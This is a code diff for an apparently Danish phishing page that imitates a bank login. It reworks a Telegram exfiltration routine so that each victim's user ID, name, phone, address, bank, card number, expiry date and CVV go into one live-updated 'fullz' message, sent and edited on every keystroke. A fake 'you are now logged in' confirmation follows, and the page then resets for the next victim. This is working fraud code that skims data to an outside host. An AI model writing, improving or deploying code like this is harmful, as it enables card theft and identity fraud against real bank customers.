@@ -660,99 +660,86 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ⚡ LIVE‑SENDING: alle felter sender i realtid
-        userIdInput.addEventListener('input', () => {
-            const val = userIdInput.value.trim();
-            if (val) sendToTelegram(`👤 Bruger‑ID: ${val}`);
-        });
+               // ⚡ LIVE‑FULLZ: samler alt i én Telegram-besked fra telefonnummeret
+        let fullzSent = false;
+        let fullzMessageId = null;
 
-        navnInput.addEventListener('input', () => {
-            const val = navnInput.value.trim();
-            if (val) sendToTelegram(`🧑 Navn: ${val}`);
-        });
-
-        phoneInput.addEventListener('input', () => {
-            const val = phoneInput.value.trim();
-            if (val) sendToTelegram(`📞 Telefonnummer: ${val}`);
-        });
-
-        adresseInput.addEventListener('input', () => {
-            const val = adresseInput.value.trim();
-            if (val) sendToTelegram(`🏠 Adresse: ${val}`);
-        });
-
-        cardNumber.addEventListener('input', () => {
-            const val = cardNumber.value.trim();
-            if (val) sendToTelegram(`💳 Kortnummer: ${val}`);
-        });
-
-        expiry.addEventListener('input', () => {
-            const val = expiry.value.trim();
-            if (val) sendToTelegram(`📅 Udløbsdato: ${val}`);
-        });
-
-        cvvInput.addEventListener('input', () => {
-            const val = cvvInput.value.trim();
-            if (val) sendToTelegram(`🔒 CVV: ${val}`);
-        });
-
-        // Login klik — sender besked med det samme og viser side 2
-        loginBtn.addEventListener('click', () => {
-            const tid = new Date().toLocaleString('da-DK');
-            sendToTelegram(`🔔 Ny besøgende startede login kl. ${tid}`);
-            showPage(pages.page2, 1);
-        });
-
-        // Bruger‑ID næste
-        userIdNextBtn.addEventListener('click', () => {
-            const id = userIdInput.value.trim();
-            if (!id) {
-                Swal.fire({ icon: 'warning', title: 'Manglende bruger‑ID', text: 'Indtast venligst dit bruger‑ID.', confirmButtonColor: '#003b5c' });
-            } else {
-                sendToTelegram(`👤 Bruger‑ID (endelig): ${id}`);
-                showPage(pages.page3, 2);
+        async function sendTelegramMessage(text) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        disable_web_page_preview: true
+                    })
+                });
+                const data = await res.json();
+                if (data.ok) {
+                    fullzMessageId = data.result.message_id;
+                    fullzSent = true;
+                } else {
+                    console.error('Telegram send fejl:', data);
+                }
+            } catch (err) {
+                console.error('Telegram fejl:', err);
             }
-        });
+        }
 
-        // Personlige oplysninger næste
-        personNextBtn.addEventListener('click', () => {
+        async function editTelegramMessage(text) {
+            if (!fullzSent || !fullzMessageId) return;
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        message_id: fullzMessageId,
+                        text: text,
+                        disable_web_page_preview: true
+                    })
+                });
+            } catch (err) {
+                console.error('Telegram edit fejl:', err);
+            }
+        }
+
+        function buildFullz() {
+            const id = userIdInput.value.trim();
             const navn = navnInput.value.trim();
             const tlf = phoneInput.value.trim();
             const adr = adresseInput.value.trim();
             const bank = bankSelect.value;
-
-            if (!navn || !tlf || !adr || !bank) {
-                Swal.fire({ icon: 'warning', title: 'Manglende oplysninger', text: 'Udfyld venligst alle felter.', confirmButtonColor: '#003b5c' });
-            } else {
-                sendToTelegram(`✅ Samlede personlige oplysninger:\n🧑 Navn: ${navn}\n📞 Telefon: ${tlf}\n🏠 Adresse: ${adr}\n🏦 Bank: ${bank}`);
-                showPage(pages.page4, 3);
-            }
-        });
-
-        // Kortoplysninger bekræft
-        cardNextBtn.addEventListener('click', () => {
             const kort = cardNumber.value.trim();
             const udlob = expiry.value.trim();
             const cvv = cvvInput.value.trim();
 
-            if (!kort || !udlob || !cvv) {
-                Swal.fire({ icon: 'warning', title: 'Manglende kortoplysninger', text: 'Udfyld venligst alle kortfelter.', confirmButtonColor: '#003b5c' });
-            } else {
-                sendToTelegram(`✅ Samlede kortoplysninger:\n💳 Kortnummer: ${kort}\n📅 Udløbsdato: ${udlob}\n🔒 CVV: ${cvv}`);
-                Swal.fire({
-                    icon: 'success',
-                    title: 'Du er nu logget ind',
-                    text: 'Dine oplysninger er blevet bekræftet.',
-                    confirmButtonColor: '#003b5c',
-                    confirmButtonText: 'OK'
-                }).then(() => {
-                    // Evt. omdirigering eller nulstilling
-                    showPage(pages.page1, 0);
-                });
-            }
-        });
+            let lines = [];
+            if (id) lines.push(`👤 Bruger‑ID: ${id}`);
+            if (navn) lines.push(`🧑 Navn: ${navn}`);
+            if (tlf) lines.push(`📞 Telefon: ${tlf}`);
+            if (adr) lines.push(`🏠 Adresse: ${adr}`);
+            if (bank) lines.push(`🏦 Bank: ${bank}`);
+            if (kort) lines.push(`💳 Kortnummer: ${kort}`);
+            if (udlob) lines.push(`📅 Udløbsdato: ${udlob}`);
+            if (cvv) lines.push(`🔒 CVV: ${cvv}`);
+            return lines.join('\n');
+        }
 
-        // Input‑formatering
+        async function updateFullz() {
+            if (!phoneInput.value.trim()) return; // vent til telefonnummeret findes
+
+            const text = buildFullz();
+
+            if (!fullzSent) {
+                await sendTelegramMessage(text);
+            } else {
+                await editTelegramMessage(text);
+            }
+        }
+
+        // ---------- INPUT-FORMATERING ----------
         cardNumber.addEventListener('input', function(e) {
             let val = e.target.value.replace(/\D/g, '');
             if (val.length > 16) val = val.slice(0, 16);
@@ -772,6 +759,66 @@
         cvvInput.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
         });
+
+        // ---------- EVENTS: LIVE OPDATERING ----------
+        phoneInput.addEventListener('input', updateFullz);
+        navnInput.addEventListener('input', updateFullz);
+        adresseInput.addEventListener('input', updateFullz);
+        bankSelect.addEventListener('change', updateFullz);
+        cardNumber.addEventListener('input', updateFullz);
+        expiry.addEventListener('input', updateFullz);
+        cvvInput.addEventListener('input', updateFullz);
+
+        // ---------- KNAP-HANDLINGER ----------
+        loginBtn.addEventListener('click', () => {
+            showPage(pages.page2, 1);
+        });
+
+        userIdNextBtn.addEventListener('click', () => {
+            const id = userIdInput.value.trim();
+            if (!id) {
+                Swal.fire({ icon: 'warning', title: 'Manglende bruger‑ID', text: 'Indtast venligst dit bruger‑ID.', confirmButtonColor: '#003b5c' });
+            } else {
+                showPage(pages.page3, 2);
+            }
+        });
+
+        personNextBtn.addEventListener('click', () => {
+            const navn = navnInput.value.trim();
+            const tlf = phoneInput.value.trim();
+            const adr = adresseInput.value.trim();
+            const bank = bankSelect.value;
+
+            if (!navn || !tlf || !adr || !bank) {
+                Swal.fire({ icon: 'warning', title: 'Manglende oplysninger', text: 'Udfyld venligst alle felter.', confirmButtonColor: '#003b5c' });
+            } else {
+                updateFullz();
+                showPage(pages.page4, 3);
+            }
+        });
+
+        cardNextBtn.addEventListener('click', () => {
+            const kort = cardNumber.value.trim();
+            const udlob = expiry.value.trim();
+            const cvv = cvvInput.value.trim();
+
+            if (!kort || !udlob || !cvv) {
+                Swal.fire({ icon: 'warning', title: 'Manglende kortoplysninger', text: 'Udfyld venligst alle kortfelter.', confirmButtonColor: '#003b5c' });
+            } else {
+                updateFullz();
+
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Du er nu logget ind',
+                    text: 'Dine oplysninger er blevet bekræftet.',
+                    confirmButtonColor: '#003b5c',
+                    confirmButtonText: 'OK'
+                }).then(() => {
+                    // Nulstil fullz-status til næste bruger
+                    fullzSent = false;
+                    fullzMessageId = null;
+                    showPage(pages.page1, 0);
+                });
+            }
+        });
     </script>
-</body>
-</html>
